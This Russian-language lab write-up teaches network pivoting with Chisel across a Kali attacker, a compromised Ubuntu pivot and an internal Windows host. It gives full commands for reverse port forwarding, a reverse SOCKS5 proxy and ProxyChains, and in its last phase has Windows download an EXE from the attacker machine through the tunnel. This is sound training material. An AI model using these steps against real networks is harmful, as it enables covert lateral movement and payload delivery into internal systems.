# Network Pivoting Lab: Chisel

Практическая лабораторная работа по изучению сетевого пивотинга с
помощью **Chisel**. Сценарий моделирует ситуацию, в которой
злоумышленник получил первоначальный доступ к Ubuntu-серверу сотрудника
и использует его как промежуточный узел для доступа к внутренней сети.

> **Статус:** документ охватывает первые два этапа. Неподтверждённые
> результаты явно отмечены.

## 1. Архитектура лаборатории

Лаборатория построена на виртуальных машинах в **KVM / virt-manager**.
Ubuntu имеет два сетевых интерфейса и выполняет роль pivot host.

  -----------------------------------------------------------------------
  Машина                  Роль                    IP-адрес
  ----------------------- ----------------------- -----------------------
  Kali Linux              Машина атакующего,      `192.168.122.59`
                          Chisel Server           

  Ubuntu-1                Первоначально           `192.168.122.153` и
                          скомпрометированный     `192.168.0.139`
                          хост, Chisel Client /   
                          pivot                   

  Windows                 Внутренний хост,        `192.168.0.59`
                          будущая RDP-цель        
  -----------------------------------------------------------------------

``` text
Внешняя сеть: 192.168.122.0/24

Kali Linux                         Ubuntu-1
192.168.122.59  <-------------->  192.168.122.153
 Chisel Server                       Chisel Client
                                         |
                                    192.168.0.139
                                         |
                              Внутренняя сеть: 192.168.0.0/24
                                         |
                                      Windows
                                    192.168.0.59
```

Kali не должна иметь прямого доступа к Windows. Для обращения к
внутренним ресурсам используется Ubuntu как промежуточный узел.

## 2. Сценарий

Условная легенда лаборатории:

1.  Злоумышленник получает первоначальный доступ к Ubuntu через уязвимый
    веб-сайт.
2.  На Ubuntu оказывается исполняемый файл Chisel.
3.  Ubuntu устанавливает соединение с Chisel Server на Kali.
4.  Через туннель атакующий получает доступ к веб-сервису Ubuntu.
5.  Затем создаётся SOCKS5-туннель для исследования внутренней сети.
6.  Следующая запланированная цель --- доступ к Windows по RDP и
    получение второго флага.

## 3. Этап 1. Reverse Port Forwarding

### Цель

Организовать обратный проброс TCP-порта от Kali к локальному веб-сервису
на Ubuntu. Это позволяет обращаться к веб-приложению Ubuntu через порт
на Kali.

### Запуск Chisel Server на Kali

``` bash
chisel server -p 80 --reverse
```
<img width="698" height="120" alt="image" src="https://github.com/user-attachments/assets/5ca993ce-4d80-4426-98e8-b501b09b0269" />

-   `server` --- запуск Chisel в режиме сервера.
-   `-p 80` --- порт приёма подключений.
-   `--reverse` --- разрешает создание обратных туннелей.

### Подключение Chisel Client на Ubuntu

``` bash
./chisel_1.12.0_linux_amd64 client 192.168.122.59:80 R:1337:127.0.0.1:5000
```
<img width="1247" height="97" alt="image" src="https://github.com/user-attachments/assets/bcfed733-dc47-4580-8df7-82b167e74e77" />

Параметры:

-   `192.168.122.59:80` --- адрес и порт Chisel Server на Kali.
-   `R` --- reverse port forwarding.
-   `1337` --- порт, открываемый на стороне Kali.
-   `127.0.0.1:5000` --- локальный веб-сервис Ubuntu, куда
    перенаправляются соединения.

Схема туннеля:

``` text
Kali:127.0.0.1:1337
        |
        | Chisel reverse tunnel
        |
Ubuntu:127.0.0.1:5000
```

### Проверка

На Kali можно посмотреть открытые порты:

``` bash
ss -tulnp
```

Затем отправить HTTP-запрос:

``` bash
curl http://127.0.0.1:1337
```

При успешной работе туннеля запрос к порту `1337` на Kali должен попасть
на веб-сервис `127.0.0.1:5000` Ubuntu.

CLI:
<img width="867" height="793" alt="image" src="https://github.com/user-attachments/assets/e6319bad-89d1-47cd-8ebf-b7fc137945e4" />

GUI:
<img width="1921" height="937" alt="image" src="https://github.com/user-attachments/assets/096cb489-b5a2-434c-be48-5dc5a0854653" />

### Технический смысл

Reverse port forwarding позволяет получить доступ к сервису, который
доступен локально на промежуточной машине. Chisel создаёт обратный
канал, через который атакующий обращается к такому сервису со своей
машины.

**Статус:** команда reverse port forwarding использовалась. Позже
конфигурация была переключена на SOCKS5. Успешный итоговый HTTP-ответ
через `1337` в текущих записях не зафиксирован, поэтому его не следует
считать подтверждённым результатом.

## 4. Этап 2. Reverse SOCKS5 Proxy

### Цель

Создать SOCKS5-прокси на Kali, через который можно направлять
TCP-подключения к ресурсам, доступным со стороны Ubuntu. Это позволит
использовать Ubuntu как pivot host для исследования внутренней сети.

### Запуск Chisel Server на Kali

``` bash
chisel server -p 80 --reverse
```
<img width="941" height="190" alt="image" src="https://github.com/user-attachments/assets/469b8e9e-2ead-491a-929b-172859fd29db" />

### Подключение Chisel Client на Ubuntu

``` bash
./chisel_1.12.0_linux_amd64 client 192.168.122.59:80 R:socks
```

<img width="552" height="57" alt="image" src="https://github.com/user-attachments/assets/a99a0029-084d-4075-bbbc-3cf31f97281a" />

Параметр `R:socks` создаёт обратный SOCKS-туннель. На стороне Kali
появляется SOCKS5 listener на `127.0.0.1:1080`.

В выводе Chisel было получено сообщение:

``` text
2026/11/15 18:40:06 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Это подтверждает, что SOCKS listener поднят на Kali.

### Как работает туннель

``` text
Приложение на Kali
       |
       | SOCKS5: 127.0.0.1:1080
       |
   Chisel Server
       |
       | Соединение Chisel
       |
   Chisel Client на Ubuntu
       |
       |
Ресурс, доступный со стороны Ubuntu
```

Запросы через SOCKS5 обрабатываются со стороны Chisel Client. Поэтому
адрес `127.0.0.1` в целевом запросе через этот прокси относится к
loopback-интерфейсу Ubuntu.

### Проверка SOCKS5 через curl

``` bash
curl --socks5 127.0.0.1:1080 http://127.0.0.1:5000
```
<img width="909" height="745" alt="image" src="https://github.com/user-attachments/assets/bb0e23ed-8933-40dc-ad3e-742c9407a0f7" />

Здесь `127.0.0.1:1080` --- SOCKS5-прокси на Kali, а `127.0.0.1:5000` ---
веб-сервис относительно Ubuntu.

Если веб-сервис слушает только loopback Ubuntu, такой способ обращения
подходит. Если он слушает другой интерфейс, можно проверить
соответствующий адрес и порт.

### Настройка ProxyChains

ProxyChains следует настраивать на Kali, поскольку именно там
запускаются приложения, трафик которых требуется направить через
SOCKS5-туннель.

Установка:

``` bash
sudo apt update && sudo apt install proxychains4
```

Открыть конфигурационный файл:

``` bash
sudo nano /etc/proxychains4.conf
```

Добавить или раскомментировать строку:

``` ini
socks5 127.0.0.1 1080
```

Пример запуска приложения через прокси:

``` bash
proxychains4 curl http://127.0.0.1:5000
```

В этой команде целевой `127.0.0.1` также относится к Ubuntu, поскольку
запрос проходит через Chisel Client.

> ProxyChains перенаправляет поддерживаемые TCP-подключения отдельных
> приложений. Это не полноценная маршрутизация всей системы. Обычный
> ICMP ping через ProxyChains работать не будет. Для сетевого
> сканирования через SOCKS обычно используют TCP connect scan (`-sT`) и,
> при необходимости, отключают host discovery (`-Pn`).

### Текущий результат

Подтверждено сообщение Chisel о запуске reverse SOCKS listener на Kali:

``` text
127.0.0.1:1080
```

После переключения на `R:socks` проверка старого порта `1337`
завершилась ошибкой подключения. Это ожидаемо: текущий SOCKS listener
работает на `1080`, а прежний reverse port forward больше не
используется.

---

## Phase 3. Передача файла с Kali на Windows через Ubuntu

### Цель
Передать EXE-файл с Kali на внутреннюю Windows-машину, используя Ubuntu в качестве промежуточного узла и Chisel reverse port forwarding.

### Шаг 1. Запуск Chisel Server на Ubuntu
На Ubuntu:

```
./chisel_1.12.0_linux_amd64 server -p 8888 --reverse
```
<img width="600" height="64" alt="image" src="https://github.com/user-attachments/assets/2a81455a-4a8c-4570-91e4-3b4d4db2b617" />

Ubuntu принимает Chisel-подключение от Kali и разрешает reverse-туннели.

### Шаг 2. Запуск Python HTTP Server на Kali

Перейти в каталог с передаваемым EXE-файлом:
Download: [Github](https://github.com/jpillora/chisel/releases/tag/v1.12.0)
```
cd parh/to/file.exe
```

Запустить HTTP-сервер на loopback-интерфейсе:

```
python3 -m http.server 1337 --bind 127.0.0.1
```

Файл становится доступен локально на Kali по адресу:

```
http://127.0.0.1:1337/<имя_файла>.exe
```

### Шаг 3. Подключение Chisel Client с Kali

На Kali:

```
./chisel_1.12.0_linux_amd64 client 192.168.122.153:8888 R:8081:127.0.0.1:1337
```
<img width="570" height="108" alt="image" src="https://github.com/user-attachments/assets/c0a10b4a-ffae-4c34-983d-9ed49f043164" />

Назначение параметров:

- `192.168.122.153:8888` — Chisel Server на Ubuntu;
- `R` — reverse port forwarding;
- `8081` — порт, открываемый на стороне Ubuntu;
- `127.0.0.1:1337` — Python HTTP Server на Kali.

Логическая схема перенаправления:

```
Windows
   |
   | HTTP-запрос к Ubuntu:8081
   v
Ubuntu (Chisel Server)
   |
   | reverse tunnel
   v
Kali (Chisel Client)
   |
   v
127.0.0.1:1337
Python HTTP Server
```

### Шаг 4. Загрузка файла на Windows

На Windows выполнить:

```
curl.exe http://192.168.0.139:8081/<имя_файла>.exe -o <имя_файла>.exe
```

<img width="547" height="359" alt="image" src="https://github.com/user-attachments/assets/18c501ee-ca27-43e9-b75f-1fc96b3dce68" />


Запрос приходит на Ubuntu по внутренней сети. Chisel передаёт его на HTTP-сервер Kali, откуда Windows получает файл.
